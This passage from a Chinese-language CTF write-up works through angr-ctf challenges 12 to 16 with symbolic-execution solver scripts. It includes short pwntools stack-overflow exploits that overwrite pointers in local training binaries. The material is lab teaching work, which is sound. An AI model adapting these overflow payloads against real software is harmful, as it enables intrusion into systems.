便会在运行过程中自动进行路径合并，从而缓解路径爆炸的问题</p><blockquote><p>具体原理可以参考 <a href="https://users.ece.cmu.edu/~dbrumley/pdf/Avgerinos%20et%20al._2014_Enhancing%20Symbolic%20Execution%20with%20Veritesting.pdf">这篇论文</a></p></blockquote><p>因此最后的解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;12_angr_veritesting&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state, veritesting = <span class="hljs-literal">True</span>)<br>    simgr.explore(find = <span class="hljs-number">0x8049371</span>, avoid = <span class="hljs-number">0x8049393</span>)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是几秒钟就解出来了：</p><p><img src="https://s2.loli.net/2022/11/04/FvgfaL9sIjND3bh.png" alt="image.png"></p><h1 id="0x06-angr-ctf：库操作"><a href="#0x06-angr-ctf：库操作" class="headerlink" title="0x06. angr-ctf：库操作"></a>0x06. angr-ctf：库操作</h1><h2 id="13-angr-static-binary：静态编译函数替换"><a href="#13-angr-static-binary：静态编译函数替换" class="headerlink" title="13_angr_static_binary：静态编译函数替换"></a>13_angr_static_binary：静态编译函数替换</h2><p>惯例拖入 IDA，这次还是惯例的读入输入后使用 complex 函数处理后与待对比字符串进行对比的模式，和第一题基本一样，不同的是这一次的二进制文件是静态编译的</p><p><img src="https://s2.loli.net/2022/11/04/4IDZJ85bN2oV6BU.png" alt="image.png"></p><p>笔者一开始也没看明白要干啥，后面拉第一题的脚本过来简单跑了一下发现半天没出结果，看了看出题人留下的 <code>scaffold13.py</code> 中有这样的话：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># This challenge is the exact same as the first challenge, except that it was</span><br><span class="hljs-comment"># compiled as a static binary. Normally, Angr automatically replaces standard</span><br><span class="hljs-comment"># library functions with SimProcedures that work much more quickly.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># To solve the challenge, manually hook any standard library c functions that</span><br><span class="hljs-comment"># are used. Then, ensure that you begin the execution at the beginning of the</span><br><span class="hljs-comment"># main function. Do not use entry_state.</span><br></code></pre></td></tr></table></figure><p>大概就是说通常 angr 会自动将标准库当中的函数替换成 angr 内建的 SimProcedures 伪函数以获得更快的运行速度，但这一次是静态编译的题目，需要我们手动进行替换；同时由于程序运行起始是 <code>__libc_start_main()</code> ，在运行到 main 之前会走很多不必要的但是被静态编译进来的弯路，因此我们需要手动从 main 开始执行而非直接使用 <code>entry_state()</code> ，不过直接替换掉 <code>__libc_start_main()</code> 也是可以的</p><p>获取 angr 内置库函数的方式是 <code>angr.SIM_PROCEDURES[lib_name][function_name]</code> ，和我们之前自定义的 hook 函数一样都是 <code>SimProcedure</code> 类，因此我们可以使用 <code>project.hook(func_addr, sim_procedure_instance)</code> 的方式进行 hook，需要注意的是除了 <code>__libc_start_main</code> 以外的需要被 hook 的函数都有大量引用，因此不要图省事直接使用 <code>hook_symbol()</code></p><p>因此最后的解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./13_angr_static_binary&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br><br>    <span class="hljs-comment"># hook the functions</span><br>    proj.hook(<span class="hljs-number">0x8051330</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;scanf&#x27;</span>]())<br>    proj.hook(<span class="hljs-number">0x80512E0</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;printf&#x27;</span>]())<br>    proj.hook(<span class="hljs-number">0x805EC90</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;puts&#x27;</span>]())<br>    proj.hook(<span class="hljs-number">0x806D530</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;strcmp&#x27;</span>]())<br>    proj.hook_symbol(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>, <br>                     angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;glibc&#x27;</span>][<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]())<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found :<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>这一次解题大概需要半分钟左右</p><p><img src="https://s2.loli.net/2022/11/04/r6W9EHzQy8lGwXe.png" alt="image.png"></p><p>以及笔者遇到以下几个<strong>不解</strong>的点：</p><ul><li>在出题人留下的 <code>scaffold13.py</code> 中提示我们应当将初始状态设为 main 起始，但笔者这么做无法解出题目（会直接把笔者的阿里云学生机内存撑爆，但这是不应该发生的）</li><li>在 <code>explore()</code> 中将 find 与 avoid 设为检测 stdout 中字符串的方式会比直接引用基本块地址要快 5s</li><li>使用 <code>veritesting=True</code> 会大幅延长解题时间（看起来不会像在笔者有生之年解出的样子）</li><li>使用直接 hook 函数的方式可以解出题，但使用 hook <code>main()</code> 中 call 指令的方式<strong>无法找到解</strong></li><li>总的解题时间比笔者预想中要长得多</li></ul><h2 id="14-angr-shared-library：动态库的符号执行"><a href="#14-angr-shared-library：动态库的符号执行" class="headerlink" title="14_angr_shared_library：动态库的符号执行"></a>14_angr_shared_library：动态库的符号执行</h2><blockquote><p>这一题的生成脚本有点问题，直接使用会报 <code>No such file or directory </code>的 gcc error， 这是因为在生成脚本中的 <code>generate()</code> 函数最后一行的 gcc 命令中的 <code>-L</code> 参数未指定目录，在后面加一个 <code>.</code> 指定为当前目录即可</p></blockquote><p>惯例拖入 IDA，这一次在读取输入后调用了自定义的一个动态链接的 <code>validate()</code> 函数对输入进行验证，其定义在自定义库 <code>lib14_angr_shared_library.so</code> 当中</p><p><img src="https://s2.loli.net/2022/11/04/bZiq9ks4Klyf8Gz.png" alt="image.png"></p><p>那么这题直接暴力 explore 求解是可以的，但是这不是我们做题的目的：）</p><p>这题实际上的目的是让我们对动态链接库进行符号执行求解，我们可以直接将初始状态设为 <code>validate()</code>，将结束设为函数返回，并添加对返回值的约束后进行求解即可</p><p>我们现在来逆一下这个动态链接库，其中就只是比较简单的一个 complex 处理的过程而已</p><p><img src="https://s2.loli.net/2022/11/04/oQyUL8W6hb2f9zl.png" alt="image.png"></p><p>那么我们只需要模拟调用 <code>validate()</code> 的过程即可，我们先用 <code>claripy.BVS()</code> 创建一个表示要求解的字符串的符号向量，将其载入到初始状态内存中的一个地址上，之后将这块内存的地址推到栈上作为 <code>validate()</code> 的参数即可</p><p>最后就是直接 <code>explore()</code> 到函数返回后添加 <code>eax == 1</code> 的约束后求解即可，需要注意的是由于这是一个动态链接库，因此我们需要在创建 project 时通过指定加载参数 <code>load_options</code> 来<strong>手动指定加载基地址</strong>，具体写法参照笔者的 exp</p><p>因此最终的解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./lib14_angr_shared_library.so&#x27;</span><br>    base_addr = <span class="hljs-number">0x400000</span><br>    proj = angr.Project(bin_path, load_options = &#123;<br>        <span class="hljs-string">&#x27;main_opts&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;custom_base_addr&#x27;</span>: base_addr<br>        &#125;<br>    &#125;)<br>    start_addr = base_addr + <span class="hljs-number">0x129C</span> <span class="hljs-comment"># addr of validate()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br><br>    password = claripy.BVS(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-number">8</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># 8 bytes</span><br>    password_addr = <span class="hljs-number">0x3000000</span><br>    init_state.memory.store(password_addr, password)<br><br>    <span class="hljs-comment"># emulate the process of calling validate(password, 8)</span><br>    init_state.regs.ebp = init_state.regs.esp<br>    init_state.stack_push(<span class="hljs-number">8</span>)<br>    init_state.stack_push(password_addr)<br>    init_state.stack_push(<span class="hljs-number">0xdeadbeef</span>)<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = base_addr + <span class="hljs-number">0x134B</span>)<br><br>    solution_state = simgr.found[<span class="hljs-number">0</span>]<br>    solution_state.add_constraints(solution_state.regs.eax == <span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(solution_state.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是差不多秒解：</p><p><img src="https://s2.loli.net/2022/11/05/vQi5PtLqbOVWrxa.png" alt="image.png"></p><p>当然，笔者这里调用函数的方法比较粗犷，也可以使用 angr 提供的 <code>project.factory.call_state(func_addr, args...)</code> 来创建一个函数调用的初始状态，用例写法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><br>bin_path = <span class="hljs-string">&#x27;./test&#x27;</span><br>proj = angr.Project(bin_path)<br><br>func_addr = <span class="hljs-number">0xdeadbeef</span><br>init_state = proj.factory.call_state(func_addr, <span class="hljs-number">114514</span>, <span class="hljs-number">1919810</span>) <span class="hljs-comment"># func(114514, 1919810)</span><br></code></pre></td></tr></table></figure><h1 id="0x07-angr-ctf：漏洞利用"><a href="#0x07-angr-ctf：漏洞利用" class="headerlink" title="0x07. angr-ctf：漏洞利用"></a>0x07. angr-ctf：漏洞利用</h1><h2 id="15-angr-arbitrary-read：栈溢出变量覆盖"><a href="#15-angr-arbitrary-read：栈溢出变量覆盖" class="headerlink" title="15_angr_arbitrary_read：栈溢出变量覆盖"></a>15_angr_arbitrary_read：栈溢出变量覆盖</h2><p>惯例拖入 IDA，逻辑比较简单，如果第一个数不是 42698355 或者第一个数是 9507730 就输出 <code>&quot;Try again.&quot;</code> ，否则输出 s 字符串，而在读入到 v4 时存在一个栈溢出可以覆盖 s 指针，因此我们可以让其输出指定地址上的字符串</p><p><img src="https://s2.loli.net/2022/11/05/Xm2yczB6WNTa1ex.png" alt="image.png"></p><p>而众所周知 angr-ctf 当中的题目都要我们输出 <code>&quot;Good Job.&quot;</code> 字符串，我们在 IDA 中可以很容易找到他的地址，所以最后的 exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    p = process(<span class="hljs-string">&#x27;./15_angr_arbitrary_read&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;42698355 &#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x10</span> + p32(<span class="hljs-number">0x58465157</span>))<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>运行即可获得 <code>&quot;Good Job.&quot;</code> </p><p><img src="https://s2.loli.net/2022/11/05/p3gPi9TYl1fuU6h.png" alt="image.png"></p><p>——但这并不是我们做这一道题的目的，我们应当使用 angr 来求解：）</p><p>那么用 angr 该怎么做呢？一开始笔者也没太想明白，后面想到既然输入的长度是已知的，那么我们可以使用 SimProcedure 来 hook 掉 scanf，将输入作为符号位向量进行求解，同时我们应当为第二个输入字符串中的每个字符添加成可见字符的约束</p><p>那么这里我们可以使用 <code>BVS.chop(bits=n)</code> 来将符号位向量按照一定尺寸进行分割，于是最后的模拟 scanf 写法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MySimScanfProcedure</span>(angr.SimProcedure):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, <span class="hljs-built_in">str</span>, key_addr, chr_arr_addr</span>):<br>        key_bvs = claripy.BVS(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>        chr_arr_bvs = claripy.BVS(<span class="hljs-string">&#x27;chr_arr&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> chr_arr_bvs.chop(bits = <span class="hljs-number">8</span>):<br>            self.state.add_constraints(ch &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, ch &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>        self.state.memory.store(key_addr, key_bvs,<br>                                endness = proj.arch.memory_endness)<br>        self.state.memory.store(chr_arr_addr, chr_arr_bvs)<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_0&#x27;</span>] = key_bvs<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_1&#x27;</span>] = chr_arr_bvs<br><br>proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, MySimScanfProcedure())<br></code></pre></td></tr></table></figure><p>接下来我们需要判断我们的符号化向量是否获得了我们预期中的结果，我们这一次将路径探索的终结点放在 <code>puts()</code>，并判断其参数是否为 <code>&quot;Good Job.&quot;</code> 字符串的地址：</p><ul><li>使用 <code>state.memory.load()</code> 将 <code>puts()</code> 的参数提取出来</li><li>使用 <code>state.solver.symbolic()</code> 判断 <code>puts()</code> 的参数是否是我们的 BVS</li><li>使用 <code>state.copy()</code> 获取当前状态的副本，之后在该副本上添加约束以避免影响到原状态</li><li>使用 <code>state.satisfiable()</code> 判断是否满足约束，若是则添加到原状态中求解即可</li></ul><p>方便起见，这里笔者将搜索的地址设为 <code>puts()</code> 函数的 plt 表地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>    call_puts_addr = <span class="hljs-number">0x8049090</span><br>    <span class="hljs-keyword">if</span> state.addr != call_puts_addr:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    good_str_addr = <span class="hljs-number">0x58465157</span><br>    puts_param = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>,<br>                                   endness = proj.arch.memory_endness)<br>    <span class="hljs-keyword">if</span> state.solver.symbolic(puts_param):<br>        copy_state = state.copy()<br>        copy_state.add_constraints(puts_param == good_str_addr)<br>        <span class="hljs-keyword">if</span> copy_state.satisfiable():<br>            state.add_constraints(puts_param == good_str_addr)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>simgr.explore(find = is_success)<br></code></pre></td></tr></table></figure><p>除了通过复制状态后添加约束并判断的方法以外，我们也可以通过为 <code>state.satisfiable()</code> 指定 <code>extra_constraints</code> 参数的方式来在不影响状态本身已有约束集的状态下进行约束判断，因此上面的 is_success() 函数也可以写成如下形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>    call_puts_addr = <span class="hljs-number">0x8049090</span><br>    <span class="hljs-keyword">if</span> state.addr != call_puts_addr:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    good_str_addr = <span class="hljs-number">0x58465157</span><br>    puts_param = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>,<br>                                   endness = proj.arch.memory_endness)<br>    <span class="hljs-keyword">if</span> state.solver.symbolic(puts_param):<br>        <span class="hljs-keyword">if</span> state.satisfiable(extra_constraints=(puts_param == good_str_addr,)):<br>            state.add_constraints(puts_param == good_str_addr)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>simgr.explore(find = is_success)<br></code></pre></td></tr></table></figure><p>将上面的进行整合就是我们最后的 exp 了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./15_angr_arbitrary_read&#x27;</span><br>    proj = angr.Project(bin_path)<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">MySimScanfProcedure</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, <span class="hljs-built_in">str</span>, key_addr, chr_arr_addr</span>):<br>            key_bvs = claripy.BVS(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>            chr_arr_bvs = claripy.BVS(<span class="hljs-string">&#x27;chr_arr&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> chr_arr_bvs.chop(bits = <span class="hljs-number">8</span>):<br>                self.state.add_constraints(ch &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, ch &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>            self.state.memory.store(key_addr, key_bvs,<br>                                    endness = proj.arch.memory_endness)<br>            self.state.memory.store(chr_arr_addr, chr_arr_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_0&#x27;</span>] = key_bvs<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_1&#x27;</span>] = chr_arr_bvs<br><br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, MySimScanfProcedure())<br><br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>        call_puts_addr = <span class="hljs-number">0x8049090</span><br>        <span class="hljs-keyword">if</span> state.addr != call_puts_addr:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        good_str_addr = <span class="hljs-number">0x58465157</span><br>        puts_param = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>,<br>                                       endness = proj.arch.memory_endness)<br>        <span class="hljs-keyword">if</span> state.solver.symbolic(puts_param):<br>            copy_state = state.copy()<br>            copy_state.add_constraints(puts_param == good_str_addr)<br>            <span class="hljs-keyword">if</span> copy_state.satisfiable():<br>                state.add_constraints(puts_param == good_str_addr)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    simgr.explore(find = is_success)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        solution_0 = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_0&#x27;</span>])<br>        solution_1 = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_1&#x27;</span>],<br>                                                cast_to=<span class="hljs-built_in">bytes</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_0))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_1))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>运行即可成功输出 <code>&quot;Good Job.&quot;</code>：</p><p><img src="https://s2.loli.net/2022/11/30/oL6Nn2hpgq5PmHz.png" alt="image.png"></p><h2 id="16-angr-arbitrary-write：栈溢出变量覆盖"><a href="#16-angr-arbitrary-write：栈溢出变量覆盖" class="headerlink" title="16_angr_arbitrary_write：栈溢出变量覆盖"></a>16_angr_arbitrary_write：栈溢出变量覆盖</h2><p>还是惯例地拖入 IDA，本题逻辑主要是读入输入后判断 key 是否是 <code>10225924</code>，若是则拷贝字符串 <code>s</code> 到 <code>dest</code> 所指字符串，否则拷贝到 <code>unimporttant_buffer</code>，最后判断 <code>password_buffer</code> 是否为 <code>&quot;UEQFKBEC&quot;</code>，若是则输出 <code>&quot;Good Job.&quot;</code> 字符串：</p><p><img src="https://s2.loli.net/2022/11/30/FHCbNrcSz8YliIU.png" alt="image.png"></p><p>和上一题类似，本题的输入读入同样存在一个溢出，可以让我们覆盖到 <code>dest</code> ，我们不难想到的是若是将 <code>dest</code> 覆盖为 <code>password_buffer</code> 的地址，便能直接覆写其中的内容</p><p>于是最后的 exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./16_angr_arbitrary_write&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;10225924 &quot;</span> + <span class="hljs-string">b&quot;UEQFKBEC&quot;</span> + <span class="hljs-string">b&quot;arttnba3&quot;</span> + p32(<span class="hljs-number">0x58465148</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure><p>运行即可获得 <code>&quot;Good Job.&quot;</code> </p><p><img src="https://s2.loli.net/2022/12/02/RjGDpmMz5go3QrN.png" alt="image.png"></p><p>——但这并不是我们做这一道题的目的，我们应当使用 angr 来求解：）</p><p>那么用 angr 该怎么做呢？这题其实和上一道题本质上是一样的，我们同样可以通过 hook scanf 的方式来将我们的输入符号化，之后在 <code>explore()</code> 